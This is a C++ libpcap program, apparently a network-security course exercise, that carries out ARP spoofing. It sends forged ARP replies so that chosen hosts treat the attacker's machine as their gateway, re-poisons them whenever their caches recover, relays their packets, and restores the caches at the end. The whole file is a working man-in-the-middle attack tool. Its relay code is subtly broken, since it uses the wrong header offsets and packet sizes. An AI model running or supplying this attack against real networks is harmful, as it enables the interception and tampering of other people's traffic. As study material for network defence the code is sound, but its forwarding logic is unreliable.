#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <map>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip 1> <target ip 1>[<sender ip 2> <target ip 2> ...\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int sendArpPacket(pcap_t* handle, std::string aprHdr,Mac ethSmac, Mac ethDmac, 
					Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip){
	EthArpPacket packet;
	if (aprHdr == "Request"){
		packet.arp_.op_ = htons(ArpHdr::Request);
	} else if (aprHdr == "Reply") {
		packet.arp_.op_ = htons(ArpHdr::Reply);
	} else {
		printf("arp op error");
	}

	packet.eth_.dmac_ = Mac(ethDmac);
	packet.eth_.smac_ = Mac(ethSmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.smac_ = Mac(arpSmac);
	packet.arp_.sip_ = htonl(arpSip);
	packet.arp_.tmac_ = Mac(arpTmac);
	packet.arp_.tip_ = htonl(arpTip);
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	return res;
}

void my_mac_addr(char* dev, char* myMac){
	struct ifreq ifr;
	char MAC_str[18];

	#define HWADDR_len 6
    int s,i;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev);
    ioctl(s, SIOCGIFHWADDR, &ifr);
	// memcpy(&myMac, ifr.ifr_hwaddr.sa_data,6);
    for (i=0; i<HWADDR_len; i++)
        sprintf(&MAC_str[i*3],"%02X:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    MAC_str[17]='\0';
    printf("myOwn MAC Address is %s\n", MAC_str);
    
	close(s);

	strcpy(myMac, MAC_str);
	return;
}

void my_ip_addr(char* dev, char* myIp){
    struct ifreq ifr;
    char ipstr[40];
    // Ip myIp;
	int s;
 
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
 
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
    } else {
		// memcpy(&myIp, ifr.ifr_addr.sa_data,4);
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                ipstr,sizeof(struct sockaddr));
        printf("myOwn IP  Address is %s\n\n", ipstr);
		strcpy(myIp, ipstr);
    }
	close(s);
    return;
}

Ip checkMac(map<Ip, Ip> ASFMAP,	map<Ip, Mac> IP2MAC, Mac chkMac) {
		for(auto it = ASFMAP.begin(); it!=ASFMAP.end(); it++){
			if (IP2MAC[it->second] == chkMac) { return it->first; }
		}
		return 0;
}

int main(int argc, char* argv[]) {
	
	if (argc < 4 || argc %2 == 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];

	char* myMacStr = (char*)malloc(sizeof(char)*18);
	char* myIpStr  = (char*)malloc(sizeof(char)*16);
	my_mac_addr(dev, myMacStr);
	my_ip_addr(dev, myIpStr);
	Mac myMac{myMacStr};	
	Ip  myIp{myIpStr};

	// sender를 감염 시킨다고 생각을 할 것
	// 1. sender에게 주기적, 비주기적으로 보내서 감염
	// 2. sender로부터 spoofed ip packet을 수신하면 replay IP pakcet 송신

	// ARP Spoofing Flow Map
	// map for sender, target
	map<Ip, Ip> ASFMAP;
	map<Ip, Mac> IP2MAC;

	for (int i = 2 ; i < argc ; i += 2){
		Ip sender_ip{argv[i]};
		Ip target_ip{argv[i+1]};
		ASFMAP[sender_ip] = target_ip;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac broadCastMac = Mac("ff:ff:ff:ff:ff:ff");
	Mac zeroMac = Mac("00:00:00:00:00:00");

	Mac senderMac;
	Ip senderIp;
	Ip targetIp;

	// link mac to ip
	for(auto it = ASFMAP.begin(); it!=ASFMAP.end(); it++){
		if (IP2MAC.find(it->first) != IP2MAC.end()){
			continue;
		}

		// Sender(Victim)의 Mac 주소를 알아옴
		// ARP request 송신
		// handle, Mac ethSmac, Mac ethDmac, Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip
		int res =  sendArpPacket(handle, "Request", myMac, broadCastMac, myMac, myIp, zeroMac, it->first);
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		// ARP reply 수신
		while (true) {
			pcap_pkthdr* header;
			const u_char*	packet;

			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == -1 || res == -2) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthHdr* ethernet = (EthHdr*)(packet);
			
			if(ethernet->type() != EthHdr::Arp){
				continue;
			};

			ArpHdr* arp = (ArpHdr*)((uint8_t*)packet + 14);
			if(arp->tip() != myIp || arp->op() != ArpHdr::Reply) {
				continue;
			}

			senderMac = arp->smac();
			senderIp = arp->sip();
			IP2MAC[senderIp] = senderMac;
			targetIp = ASFMAP[senderIp];

			// handle, Mac ethSmac, Mac ethDmac, Mac arpSmac, Ip arpSip, Mac arpTmac, Ip arpTip
			res = sendArpPacket(handle, "Reply", myMac, senderMac, myMac, targetIp, senderMac, senderIp);
			if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}

			break;
		}
	}


	// 현재 sender는 나를 게이트웨이로 알고 있다
	// 그렇기 때문에 실제 게이트웨이에서 연락이 온다면 복구될 것
	// 이를 재 감염
	int cnt = 0;
	while (cnt < 1000) {
		pcap_pkthdr* header;
		const u_char*	packet;

		int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

		cnt ++;
		EthHdr* ethernet = (EthHdr*)(packet);
		
		// 만약 이 패킷이 target에게 reply하는 패킷이라면
		if(ethernet->type() == EthHdr::Arp){
		 	ArpHdr* arp = (ArpHdr*)((uint8_t*)packet + sizeof(EthHdr*));
			
			// cache가 만료되어 gateway에게 request를 보낼 때
			if(arp->tip_ == ASFMAP[arp->sip_] || arp->op() == ArpHdr::Request) {
				senderMac = IP2MAC[arp->sip_];
				senderIp = arp->sip_;
				targetIp = ASFMAP[arp->sip_];

				res = sendArpPacket(handle, "Reply", myMac, senderMac, myMac, targetIp, senderMac, senderIp);
				if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}

				continue;
			}
			
			// gateway가 broadcast를 보낼 때
			if(arp->tmac_ == zeroMac || arp->op() == ArpHdr::Request){

				for(auto it = ASFMAP.begin(); it!=ASFMAP.end(); it++) {
					if (arp->sip_ != ASFMAP[it->first]) continue;
					senderMac = IP2MAC[it->first];
					senderIp = it->first;
					targetIp = ASFMAP[it->first];

					res = sendArpPacket(handle, "Reply", myMac, senderMac, myMac, targetIp, senderMac, senderIp);

					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
				}

				continue;
			}

		};

		// 다른 패킷도 relay 해주어야 함
		Ip originalIp = checkMac(ASFMAP, IP2MAC, ethernet->smac());
		if (originalIp){
 			Mac originalMac = ethernet->smac();
			ethernet->dmac_ = IP2MAC[originalIp];
			ethernet->smac_ = myMac;
			memcpy((u_char*)packet, (u_char*)ethernet, sizeof(*packet));

			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
		
		}
	}

	// 마지막 recover 잊지 말기	
	for(auto it = ASFMAP.begin(); it!=ASFMAP.end(); it++){
		Ip senderIp = it->first;
		Mac senderMac = IP2MAC[it->first];
		Ip targetIp = it ->second;
		
		int res = sendArpPacket(handle, "Reply", broadCastMac, senderMac, zeroMac, targetIp, senderMac, senderIp);
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}		
	printf("finish");
	pcap_close(handle);
}
